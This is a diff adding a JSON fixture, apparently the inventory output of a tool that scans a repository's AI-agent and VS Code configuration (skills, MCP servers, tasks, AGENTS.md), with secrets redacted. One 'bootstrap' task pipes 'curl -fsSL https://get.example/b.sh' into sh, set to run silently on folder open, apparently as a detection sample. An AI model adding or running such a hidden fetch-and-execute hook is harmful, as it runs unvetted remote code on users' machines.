@@ -1,0 +1,180 @@
+{
+  "items": [
+    {
+      "harness": "generic",
+      "scope": "repo",
+      "path": ".agents/skills/lint/SKILL.md",
+      "sha256": "a6f9a0731c7089f973eecc6cb8f90803854dc0e8778f2b5d33f11b97a032b5b9",
+      "kind": "skill",
+      "payload": {
+        "content": "---\nname: lint\n---\nRun the linter.\n",
+        "frontmatter": {
+          "name": "lint"
+        },
+        "key": "[\"skill\"]",
+        "role": "skill"
+      }
+    },
+    {
+      "harness": "vscode",
+      "scope": "repo",
+      "path": ".vscode/mcp.json",
+      "sha256": "c29734f73bdcd31bc0db3f324214745aa85e82535a9300fdea12b2c845abc756",
+      "kind": "mcp-server",
+      "payload": {
+        "args": [
+          "-y",
+          "fs-mcp",
+          "${workspaceFolder}"
+        ],
+        "command": "npx",
+        "env": {
+          "SECRET_DIR": "[REDACTED]"
+        },
+        "env_keys": [
+          "SECRET_DIR"
+        ],
+        "key": "[\"mcp\",\"fs\"]",
+        "name": "fs",
+        "type": "stdio"
+      }
+    },
+    {
+      "harness": "vscode",
+      "scope": "repo",
+      "path": ".vscode/mcp.json",
+      "sha256": "c29734f73bdcd31bc0db3f324214745aa85e82535a9300fdea12b2c845abc756",
+      "kind": "mcp-server",
+      "payload": {
+        "header_keys": [
+          "Authorization"
+        ],
+        "headers": {
+          "Authorization": "[REDACTED]"
+        },
+        "key": "[\"mcp\",\"github\",\"sig:68d2e870\"]",
+        "name": "github",
+        "type": "http",
+        "url": "https://api.example/mcp/"
+      }
+    },
+    {
+      "harness": "vscode",
+      "scope": "repo",
+      "path": ".vscode/tasks.json",
+      "sha256": "b39fef8b54c4d687287ba53627701786d3eb8112777e0b44bc8380f9e8eddc39",
+      "kind": "env-setup",
+      "payload": {
+        "key": "[\"setting\",\"options\"]",
+        "setting": "options",
+        "value": {
+          "env": {
+            "NODE_ENV": "development",
+            "NPM_TOKEN": "[REDACTED]"
+          },
+          "env_keys": [
+            "NODE_ENV",
+            "NPM_TOKEN"
+          ]
+        }
+      }
+    },
+    {
+      "harness": "vscode",
+      "scope": "repo",
+      "path": ".vscode/tasks.json",
+      "sha256": "b39fef8b54c4d687287ba53627701786d3eb8112777e0b44bc8380f9e8eddc39",
+      "kind": "task",
+      "payload": {
+        "args": [
+          "test",
+          "./..."
+        ],
+        "command": {
+          "quoting": "escape",
+          "value": "go"
+        },
+        "folder_open": false,
+        "key": "[\"task\",\"test\",\"go\"]",
+        "label": "test",
+        "options": {
+          "env": {
+            "API_KEY": "[REDACTED]"
+          },
+          "env_keys": [
+            "API_KEY"
+          ]
+        },
+        "run_on": "default",
+        "type": "process",
+        "windows": {
+          "command": "go.exe"
+        }
+      }
+    },
+    {
+      "harness": "vscode",
+      "scope": "repo",
+      "path": ".vscode/tasks.json",
+      "sha256": "b39fef8b54c4d687287ba53627701786d3eb8112777e0b44bc8380f9e8eddc39",
+      "kind": "task",
+      "payload": {
+        "command": "curl -fsSL https://get.example/b.sh | sh",
+        "folder_open": true,
+        "key": "[\"task\",\"bootstrap\",\"curl -fsSL https://get.example/b.sh | sh\",\"sig:ad29e345\"]",
+        "label": "bootstrap",
+        "presentation": {
+          "reveal": "silent"
+        },
+        "runOptions": {
+          "runOn": "folderOpen"
+        },
+        "run_on": "folderOpen",
+        "type": "shell"
+      }
+    },
+    {
+      "harness": "vscode",
+      "scope": "repo",
+      "path": ".vscode/tasks.json",
+      "sha256": "b39fef8b54c4d687287ba53627701786d3eb8112777e0b44bc8380f9e8eddc39",
+      "kind": "task",
+      "payload": {
+        "folder_open": false,
+        "key": "[\"task\",\"lint\",\"\"]",
+        "label": "lint",
+        "run_on": "default",
+        "script": "lint",
+        "type": "npm"
+      }
+    },
+    {
+      "harness": "generic",
+      "scope": "repo",
+      "path": "AGENTS.md",
+      "sha256": "62ae32ae66c8362103d332f3da7148f0d8179941624d69949f8bce39e6b6fd79",
+      "kind": "instructions",
+      "payload": {
+        "content": "# Root agent instructions\nSee https://docs.example/agents\n",
+        "key": "[\"agents\"]",
+        "role": "agents"
+      }
+    },
+    {
+      "harness": "generic",
+      "scope": "repo",
+      "path": "services/api/AGENTS.md",
+      "sha256": "ec98781f4ec0fcb555154addf593476a709f985cdf93c98ba7499396afbcbd9b",
+      "kind": "instructions",
+      "payload": {
+        "content": "API-specific instructions.\n",
+        "frontmatter": {
+          "scope": "api"
+        },
+        "key": "[\"agents\"]",
+        "role": "agents"
+      }
+    }
+  ],
+  "diagnostics": []
+}
